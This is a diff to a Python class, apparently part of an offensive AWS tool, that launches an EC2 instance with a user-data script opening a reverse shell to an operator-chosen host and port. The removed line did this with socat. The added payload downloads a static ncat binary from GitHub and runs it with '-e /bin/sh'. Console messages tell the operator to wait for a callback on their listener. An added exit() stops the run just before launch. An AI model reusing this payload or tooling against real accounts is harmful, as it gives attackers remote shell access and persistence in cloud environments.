@@ -8,7 +8,10 @@ class Ec2():
     def __init__(self, session, console):
         self.ec2 = session.client("ec2")
         self.console = console
-        self.user_data_payload = f"sudo apt update && sudo apt install socat -y && socat tcp:<rhost>:<rport> exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+        self.user_data_payload = f"""#!/bin/bash
+sudo apt update
+wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat -O /tmp/ncat
+chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
     
     def _create_key_pair(self, key_name: str):
         def _create(key_name: str, dry=True):
@@ -83,12 +86,12 @@ class Ec2():
             exit()
         self.console.print("Successfully launched Ec2 instance.. ([green]SUCCESS[/green])")
         instance_id = results["Instances"][0]["InstanceId"]
-        self.console.print("\t\u2022 Instance ID:", instance_id)
+        self.console.print(' '* 3+"\u2022 Instance ID:", instance_id)
         self.console.print("Retrieving instance public IP address.. ([blue]INFO[/blue])")
         sleep(5)
         try:
             results = self.ec2.describe_instances(InstanceIds=[instance_id])
-            self.console.print("\t\u2022 Public IP Address:", results["Reservations"][0]["Instances"][0]["PublicIpAddress"])
+            self.console.print(' '*3+"\u2022 Public IP Address:", results["Reservations"][0]["Instances"][0]["PublicIpAddress"])
         except ClientError:
             self.console.log("An error occured while attempting to retrieve instance public IP address.. ([red]ERROR[/red])")
             exit()
@@ -106,9 +109,10 @@ class Ec2():
         self.user_data_payload = self.user_data_payload.replace("<rhost>", rhost)
         self.user_data_payload = self.user_data_payload.replace("<rport>", str(rport))
         _tmp_payload = self.user_data_payload.replace(" && ", "\n")
-        self.console.print(f"User data payload preview.. ([yellow]PREVIEW[/yellow])")
+        self.console.print(f"User data payload.. ([yellow]PREVIEW[/yellow])")
         self.console.print("-"*70+f"\n{_tmp_payload}\n"+"-"*70)
         self.console.print("Running instance with reverse shell user data script.. ([green]OK[/green])")
+        exit()
         self._run_instance(ami_id=ami_id, instance_type=instance_type, user_data=self.user_data_payload)
         self.console.print("\nCheck your TCP listener after a minute or two for a callback.. ([red]ACTION[/red])")
 
